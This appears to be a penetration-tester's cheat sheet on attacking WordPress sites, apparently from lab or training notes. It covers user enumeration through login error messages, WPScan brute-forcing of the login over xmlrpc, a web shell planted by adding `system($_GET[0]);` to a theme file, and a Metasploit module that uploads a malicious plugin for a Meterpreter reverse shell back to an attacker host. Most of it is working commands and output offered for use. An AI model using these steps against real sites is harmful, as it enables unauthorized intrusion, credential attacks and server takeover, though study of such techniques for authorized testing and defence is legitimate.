### Content

- [Enumeration](#enumeration)
	- [Manual](#manual)
	- [Automated](#automated)
- [Attacks](#attacks)
	- [Login Brute Force](#login-brute-force)
	- [RCE](#rce)
		- [Abusing Themes](#abusing-themes)
		- [Abusing Malicious Plugin](#abusing-malicious-plugin)

> [!Note]
> - WordPress is written in PHP and usually runs on Apache with MySQL as the backend.
> - Plugins: `/wp-content/plugins` directory.
> 	- Plugin info: `/wp-content/plugins/<PLUGIN_NAME>/readme.txt` - {"stable tag" : "version"}
> - Themes: `/wp-content/themes` directory.
> 	- Theme info: `/wp-content/themes/<THEME_NAME>/readme.txt` - {"stable tag" : "version"}
> - Login portal: `/wp-admin/wp-login.php`
> - See `robots.txt` 
> - Users on WP installation:
> 	- Administrator
> 	- Editor   `Maybe has access to certain vulnerable plugins`
> 	- Author `Maybe has access to certain vulnerable plugins`
> 	- Contributor
> 	- Subscriber

---
### Enumeration
##### Manual

```bash
# # # Enumerate different web app pages for better results and coverage.
# Version
$ curl -s http://FQDN | grep WordPress

# Themes
$ curl -s http://FQDN | grep themes

# Plugins
$ curl -s http://FQDN | grep plugins

# Users
# Case 1: Only the password is incorrect
$ curl -s http://FQDN/wp-login.php -d "log=admin" -d "pwd=PASSWORD"
[SNIP]
The password you entered for the username <strong>admin</strong> isincorrect.
# Case 2: The Username is incorrect
$ curl -s http://FQDN/wp-login.php -d "log=anonymous" -d "pwd=PASSWORD"
[SNIP]
The username <strong>anonymous</strong> is not registered on this site.
```

##### Automated

###### WPScan

- Automated WordPress scanner and enumeration tool.
- Determines if the various themes and plugins used by a blog are outdated or vulnerable.
- Able to pull in vulnerability information from external sources.
	- Obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports.
	- WPScan provides report about known vulnerabilities. (ex: URLs to PoCs)

```bash
$ wpscan --url http://FQDN --enumerate --api-token <TOKEN> -t <THREADS>
```

---
### Attacks

#### Login Brute Force

WPScan can be used for this, and it can do it with two methods:

- `wp-login`: Brute force the standard WordPress login page.
- `xmlrpc` Uses WordPress API to make login attempts through `/xmlrpc.php`. (FASTER)

```bash
$ wpscan --url "http://FQDN/" --password-attack xmlrpc -t 20 -U doug -P <PASSWORD.lst>
```

#### RCE

##### Abusing Themes

Open the theme editor and choose an inactive theme to avoid corrupting the main theme and adding `system($_GET[0]);` to a `.php` file then update it.

<img src="/assets/common_apps_wp_theme_edit.png" style="display: block; margin:auto; height:500;">

```bash
$ curl -s http://FQDN/wp-content/themes/twentynineteen/404.php?0=id           
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##### Abusing Malicious Plugin 

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. (like the process on this [link](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=php%20plugin#php-plugin))

```bash 
msf > use exploit/unix/webapp/wp_admin_shell_upload 
msf exploit(unix/webapp/wp_admin_shell_upload) > set username doug
msf exploit(unix/webapp/wp_admin_shell_upload) > set password jessica1
msf exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.47
msf exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.129.134.66
msf exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.website.local
msf exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

---












